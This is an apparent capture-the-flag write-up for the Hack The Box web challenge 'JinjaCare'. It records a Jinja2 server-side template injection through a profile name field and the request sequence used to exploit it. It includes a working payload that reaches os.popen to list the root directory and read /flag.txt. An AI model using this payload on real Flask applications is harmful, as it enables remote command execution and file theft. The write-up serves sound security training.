# HTB Challenge: JinjaCare (web, Very Easy, 100 XP)

- Target: 154.57.164.80:44946
- Official writeup PDF (Downloads/9f0ec5a3-...pdf) gave the full method.

## SOLVED ✅ — Flag: HTB{v3ry_e4sy_sst1_r1ght?}

### Vulnerability
Flask `render_template_string` (or equivalent) called unsanitized on the user's "Full Name"
profile field when generating the PDF vaccination certificate -> classic SSTI.

### Flow
1. POST /register (name, email, password, confirmPassword)
2. POST /login (email, password)
3. POST /profile/personal with `name` = SSTI payload -- **all other form fields must also be
   present in the POST** (email, phone, address, dateOfBirth, gender, emergencyName,
   emergencyPhone, relationship) or the server silently ignores the whole update.
4. GET /generate_certificate -> returns a PDF with the name field rendered server-side.
   Extract text with `pdftotext cert.pdf -`.

### Payloads used
- Sanity check: `{{7*7}}` -> renders `49`.
- Enumerate root dir: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}`
  -> reveals `flag.txt` at `/flag.txt`.
- Read flag: same primitive with `cat /flag.txt`.

### Script
`workspaces/jinjacare/solve.py` -- fully automated, one run, registers a fresh throwaway
account each time (timestamp-based email), confirms SSTI, enumerates `/`, greps for a
flag-like filename, reads it, and regexes `HTB{...}` out of the resulting PDF text.
